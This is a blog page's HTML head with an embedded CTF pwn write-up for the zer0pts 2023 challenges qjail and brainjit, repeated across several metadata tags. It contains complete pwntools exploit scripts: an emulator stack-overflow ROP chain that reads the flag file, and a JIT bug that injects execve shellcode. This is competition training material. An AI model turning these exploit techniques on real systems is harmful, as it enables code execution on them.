@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>zer0pts ctf pwn writeup | ln3’s blog</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="zer0pts ctf pwn writeup" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="qjail qiling模拟执行框架下的栈溢出漏洞 #!/usr/bin/env python3 import qiling from qiling.const import QL_VERBOSE import sys if __name__ == &#39;__main__&#39;: if len(sys.argv) &lt; 2: print(f&quot;Usage: {sys.argv[0]} &lt;ELF&gt;&quot;) sys.exit(1) cmd = [&#39;./lib/ld-2.31.so&#39;, &#39;--library-path&#39;, &#39;/lib&#39;, sys.argv[1]] ql = qiling.Qiling(cmd, verbose=QL_VERBOSE.DEBUG,console=False, rootfs=&#39;.&#39;) ql.run() 看qiling源码 在loader/elf.py里是他的elf加载逻辑 其中有一段： 根据经验AT_RANDOM的值指向canary 往上翻可以看见randstraddr的来源 能够猜+试出来canary是7个a和一个00 elf加载地址在qiling的profile里的linux profile [OS64] stack_address = 0x7ffffffde000 stack_size = 0x30000 load_address = 0x555555554000 interp_address = 0x7ffff7dd5000 mmap_address = 0x7fffb7dd6000 vsyscall_address = 0xffffffffff600000 但是这里由于qiling启动的是ld，所以之前看到的pie地址其实是ld的，elf在profile里的mmap地址范围 这里还是通过qiling的gdb server调试才发现的，https://docs.qiling.io/en/latest/debugger/ 然后就是直接看出其他段的地址，应该都是不变的 重新算地址，pop rdi，重回main都没问题了 system会有点问题，所以最后orw读flag.txt from pwn import * context.arch = &#39;amd64&#39; pie = 0x7fffb7dd6000 libc_base = 0x7fffb7ddb000 # sh = process([&#39;./sandbox.py&#39;,&#39;bin/vuln&#39;]) sh = remote(&#39;pwn.2023.zer0pts.com&#39;,&#39;9005&#39;) elf = ELF(&#39;bin/vuln&#39;,checksec=False) elf.address = pie pop_rdi = 0x00000000000012a3 + pie main = pie + 0x11a9 libc = ELF(&#39;lib/libc.so.6&#39;,checksec=False) libc.address = libc_base pop_rsi = libc_base + 0x000000000002601f pop_rdx = libc_base + 0x0000000000142c92 str_addr = elf.bss(0x100) # 0x000000000010257e: pop rcx; pop rbx; ret; pop_rcx_rbx = libc_base + 0x000000000010257e # 0x000000000005b622: mov rdi, rax; cmp rdx, rcx; jae 0x5b60c; mov rax, r8; ret; mov_rdi_rax = libc_base + 0x000000000005b622 buff = elf.bss(0x180) payload = flat({ 0x109:b&#39;a&#39; * 7, 0x118:[ pop_rdi, 0, pop_rsi, str_addr, pop_rdx, 0x30, libc.sym[&#39;read&#39;], pop_rdi, str_addr, pop_rsi, 0, libc.sym[&#39;open&#39;], pop_rcx_rbx, 0x81, 0, pop_rdx, 0x80, pop_rsi, buff, mov_rdi_rax, libc.sym[&#39;read&#39;], pop_rdi, 1, pop_rsi, buff, pop_rdx, 0x80, libc.sym[&#39;write&#39;], pop_rdi, 0, libc.sym[&#39;exit&#39;] ] },filler=b&#39;\x00&#39;) # pause() sh.sendlineafter(b&#39;something\n&#39;,payload) pause() sh.send(b&#39;./flag.txt&#39;) sh.interactive() brainjit brainfxxk jit编译器，全部用python实现 有个功能是为多个连续的操作独立生成汇编，length标识重复长度 jit利用漏洞种类比较少，一般是指令生成错误或者生成过程中溢出截断导致 这题里shellcode分有数据区跟代码区，但是中间的越界会被python层捕获，无法利用 漏洞是缺少方括号闭合检查，导致可以跳到jz指令末尾的0xff上，跟后面的指令偏一下，就可以执行一两个字节的指令 观察一下寄存器环境后不难写出push pop ret这3个字节的shellcode，利用数据区的rwx属性，往数据区里填充execve的shellcode，最后跳转过去 from pwn import * context.arch = &#39;amd64&#39; # sh = process([&#39;./app.py&#39;]) idx = 0 def write(adjust,v,old=0): d = &#39;&gt;&#39; if adjust &lt; 0: d = &#39;&lt;&#39; adjust = abs(adjust) payload = d * adjust if old != None and old &gt; v: payload += &#39;-&#39; * (old-v) else: payload += &#39;+&#39; * (v-old) return payload # sc = asm(shellcraft.sh()) # for i in sc: # print(&quot;code += &#39;&quot; + write(1,i) + &quot;&#39;&quot;) code = &#39;[+&#39; + &#39;&gt;&#39; * 0x5558 # pop rax # push rbp # shellcode code += &#39;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++&#39; code += &#39;&gt;+++++&#39; code += &#39;&gt;[+&#39; + &#39;&gt;&#39; * 0xc3 # ret sh = remote(&#39;pwn.2023.zer0pts.com&#39;,&#39;9004&#39;) sh.sendline(code) sh.interactive() # zer0pts{Bug_0fT3n_c0M3s_fR0m_L4ck_0f_t3sT_f0r_1nv4L1d_1npuTs}" />
+<meta property="og:description" content="qjail qiling模拟执行框架下的栈溢出漏洞 #!/usr/bin/env python3 import qiling from qiling.const import QL_VERBOSE import sys if __name__ == &#39;__main__&#39;: if len(sys.argv) &lt; 2: print(f&quot;Usage: {sys.argv[0]} &lt;ELF&gt;&quot;) sys.exit(1) cmd = [&#39;./lib/ld-2.31.so&#39;, &#39;--library-path&#39;, &#39;/lib&#39;, sys.argv[1]] ql = qiling.Qiling(cmd, verbose=QL_VERBOSE.DEBUG,console=False, rootfs=&#39;.&#39;) ql.run() 看qiling源码 在loader/elf.py里是他的elf加载逻辑 其中有一段： 根据经验AT_RANDOM的值指向canary 往上翻可以看见randstraddr的来源 能够猜+试出来canary是7个a和一个00 elf加载地址在qiling的profile里的linux profile [OS64] stack_address = 0x7ffffffde000 stack_size = 0x30000 load_address = 0x555555554000 interp_address = 0x7ffff7dd5000 mmap_address = 0x7fffb7dd6000 vsyscall_address = 0xffffffffff600000 但是这里由于qiling启动的是ld，所以之前看到的pie地址其实是ld的，elf在profile里的mmap地址范围 这里还是通过qiling的gdb server调试才发现的，https://docs.qiling.io/en/latest/debugger/ 然后就是直接看出其他段的地址，应该都是不变的 重新算地址，pop rdi，重回main都没问题了 system会有点问题，所以最后orw读flag.txt from pwn import * context.arch = &#39;amd64&#39; pie = 0x7fffb7dd6000 libc_base = 0x7fffb7ddb000 # sh = process([&#39;./sandbox.py&#39;,&#39;bin/vuln&#39;]) sh = remote(&#39;pwn.2023.zer0pts.com&#39;,&#39;9005&#39;) elf = ELF(&#39;bin/vuln&#39;,checksec=False) elf.address = pie pop_rdi = 0x00000000000012a3 + pie main = pie + 0x11a9 libc = ELF(&#39;lib/libc.so.6&#39;,checksec=False) libc.address = libc_base pop_rsi = libc_base + 0x000000000002601f pop_rdx = libc_base + 0x0000000000142c92 str_addr = elf.bss(0x100) # 0x000000000010257e: pop rcx; pop rbx; ret; pop_rcx_rbx = libc_base + 0x000000000010257e # 0x000000000005b622: mov rdi, rax; cmp rdx, rcx; jae 0x5b60c; mov rax, r8; ret; mov_rdi_rax = libc_base + 0x000000000005b622 buff = elf.bss(0x180) payload = flat({ 0x109:b&#39;a&#39; * 7, 0x118:[ pop_rdi, 0, pop_rsi, str_addr, pop_rdx, 0x30, libc.sym[&#39;read&#39;], pop_rdi, str_addr, pop_rsi, 0, libc.sym[&#39;open&#39;], pop_rcx_rbx, 0x81, 0, pop_rdx, 0x80, pop_rsi, buff, mov_rdi_rax, libc.sym[&#39;read&#39;], pop_rdi, 1, pop_rsi, buff, pop_rdx, 0x80, libc.sym[&#39;write&#39;], pop_rdi, 0, libc.sym[&#39;exit&#39;] ] },filler=b&#39;\x00&#39;) # pause() sh.sendlineafter(b&#39;something\n&#39;,payload) pause() sh.send(b&#39;./flag.txt&#39;) sh.interactive() brainjit brainfxxk jit编译器，全部用python实现 有个功能是为多个连续的操作独立生成汇编，length标识重复长度 jit利用漏洞种类比较少，一般是指令生成错误或者生成过程中溢出截断导致 这题里shellcode分有数据区跟代码区，但是中间的越界会被python层捕获，无法利用 漏洞是缺少方括号闭合检查，导致可以跳到jz指令末尾的0xff上，跟后面的指令偏一下，就可以执行一两个字节的指令 观察一下寄存器环境后不难写出push pop ret这3个字节的shellcode，利用数据区的rwx属性，往数据区里填充execve的shellcode，最后跳转过去 from pwn import * context.arch = &#39;amd64&#39; # sh = process([&#39;./app.py&#39;]) idx = 0 def write(adjust,v,old=0): d = &#39;&gt;&#39; if adjust &lt; 0: d = &#39;&lt;&#39; adjust = abs(adjust) payload = d * adjust if old != None and old &gt; v: payload += &#39;-&#39; * (old-v) else: payload += &#39;+&#39; * (v-old) return payload # sc = asm(shellcraft.sh()) # for i in sc: # print(&quot;code += &#39;&quot; + write(1,i) + &quot;&#39;&quot;) code = &#39;[+&#39; + &#39;&gt;&#39; * 0x5558 # pop rax # push rbp # shellcode code += &#39;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++&#39; code += &#39;&gt;+++++&#39; code += &#39;&gt;[+&#39; + &#39;&gt;&#39; * 0xc3 # ret sh = remote(&#39;pwn.2023.zer0pts.com&#39;,&#39;9004&#39;) sh.sendline(code) sh.interactive() # zer0pts{Bug_0fT3n_c0M3s_fR0m_L4ck_0f_t3sT_f0r_1nv4L1d_1npuTs}" />
+<link rel="canonical" href="http://localhost:4000/ctf/2023/07/15/zer0pts.html" />
+<meta property="og:url" content="http://localhost:4000/ctf/2023/07/15/zer0pts.html" />
+<meta property="og:site_name" content="ln3’s blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-07-15T00:20:22+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="zer0pts ctf pwn writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-07-15T00:20:22+08:00","datePublished":"2023-07-15T00:20:22+08:00","description":"qjail qiling模拟执行框架下的栈溢出漏洞 #!/usr/bin/env python3 import qiling from qiling.const import QL_VERBOSE import sys if __name__ == &#39;__main__&#39;: if len(sys.argv) &lt; 2: print(f&quot;Usage: {sys.argv[0]} &lt;ELF&gt;&quot;) sys.exit(1) cmd = [&#39;./lib/ld-2.31.so&#39;, &#39;--library-path&#39;, &#39;/lib&#39;, sys.argv[1]] ql = qiling.Qiling(cmd, verbose=QL_VERBOSE.DEBUG,console=False, rootfs=&#39;.&#39;) ql.run() 看qiling源码 在loader/elf.py里是他的elf加载逻辑 其中有一段： 根据经验AT_RANDOM的值指向canary 往上翻可以看见randstraddr的来源 能够猜+试出来canary是7个a和一个00 elf加载地址在qiling的profile里的linux profile [OS64] stack_address = 0x7ffffffde000 stack_size = 0x30000 load_address = 0x555555554000 interp_address = 0x7ffff7dd5000 mmap_address = 0x7fffb7dd6000 vsyscall_address = 0xffffffffff600000 但是这里由于qiling启动的是ld，所以之前看到的pie地址其实是ld的，elf在profile里的mmap地址范围 这里还是通过qiling的gdb server调试才发现的，https://docs.qiling.io/en/latest/debugger/ 然后就是直接看出其他段的地址，应该都是不变的 重新算地址，pop rdi，重回main都没问题了 system会有点问题，所以最后orw读flag.txt from pwn import * context.arch = &#39;amd64&#39; pie = 0x7fffb7dd6000 libc_base = 0x7fffb7ddb000 # sh = process([&#39;./sandbox.py&#39;,&#39;bin/vuln&#39;]) sh = remote(&#39;pwn.2023.zer0pts.com&#39;,&#39;9005&#39;) elf = ELF(&#39;bin/vuln&#39;,checksec=False) elf.address = pie pop_rdi = 0x00000000000012a3 + pie main = pie + 0x11a9 libc = ELF(&#39;lib/libc.so.6&#39;,checksec=False) libc.address = libc_base pop_rsi = libc_base + 0x000000000002601f pop_rdx = libc_base + 0x0000000000142c92 str_addr = elf.bss(0x100) # 0x000000000010257e: pop rcx; pop rbx; ret; pop_rcx_rbx = libc_base + 0x000000000010257e # 0x000000000005b622: mov rdi, rax; cmp rdx, rcx; jae 0x5b60c; mov rax, r8; ret; mov_rdi_rax = libc_base + 0x000000000005b622 buff = elf.bss(0x180) payload = flat({ 0x109:b&#39;a&#39; * 7, 0x118:[ pop_rdi, 0, pop_rsi, str_addr, pop_rdx, 0x30, libc.sym[&#39;read&#39;], pop_rdi, str_addr, pop_rsi, 0, libc.sym[&#39;open&#39;], pop_rcx_rbx, 0x81, 0, pop_rdx, 0x80, pop_rsi, buff, mov_rdi_rax, libc.sym[&#39;read&#39;], pop_rdi, 1, pop_rsi, buff, pop_rdx, 0x80, libc.sym[&#39;write&#39;], pop_rdi, 0, libc.sym[&#39;exit&#39;] ] },filler=b&#39;\\x00&#39;) # pause() sh.sendlineafter(b&#39;something\\n&#39;,payload) pause() sh.send(b&#39;./flag.txt&#39;) sh.interactive() brainjit brainfxxk jit编译器，全部用python实现 有个功能是为多个连续的操作独立生成汇编，length标识重复长度 jit利用漏洞种类比较少，一般是指令生成错误或者生成过程中溢出截断导致 这题里shellcode分有数据区跟代码区，但是中间的越界会被python层捕获，无法利用 漏洞是缺少方括号闭合检查，导致可以跳到jz指令末尾的0xff上，跟后面的指令偏一下，就可以执行一两个字节的指令 观察一下寄存器环境后不难写出push pop ret这3个字节的shellcode，利用数据区的rwx属性，往数据区里填充execve的shellcode，最后跳转过去 from pwn import * context.arch = &#39;amd64&#39; # sh = process([&#39;./app.py&#39;]) idx = 0 def write(adjust,v,old=0): d = &#39;&gt;&#39; if adjust &lt; 0: d = &#39;&lt;&#39; adjust = abs(adjust) payload = d * adjust if old != None and old &gt; v: payload += &#39;-&#39; * (old-v) else: payload += &#39;+&#39; * (v-old) return payload # sc = asm(shellcraft.sh()) # for i in sc: # print(&quot;code += &#39;&quot; + write(1,i) + &quot;&#39;&quot;) code = &#39;[+&#39; + &#39;&gt;&#39; * 0x5558 # pop rax # push rbp # shellcode code += &#39;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39; code += &#39;&gt;+++++++++++++++&#39; code += &#39;&gt;+++++&#39; code += &#39;&gt;[+&#39; + &#39;&gt;&#39; * 0xc3 # ret sh = remote(&#39;pwn.2023.zer0pts.com&#39;,&#39;9004&#39;) sh.sendline(code) sh.interactive() # 